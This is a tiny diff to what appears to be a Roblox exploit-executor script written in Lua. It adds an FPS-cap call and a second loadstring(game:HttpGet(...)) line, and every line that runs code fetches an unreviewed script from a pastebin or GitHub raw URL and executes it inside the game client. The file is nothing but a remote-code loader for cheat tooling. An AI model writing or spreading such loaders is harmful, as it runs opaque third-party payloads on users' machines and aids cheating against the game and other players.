@@ -1,1 +1,5 @@
+setfpscap(999)
+
+loadstring(game:HttpGet("https://pastebin.com/raw/zdqXD3tT"))()
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/AsianTwchSecond/Loveu/refs/heads/main/texs.txt"))()
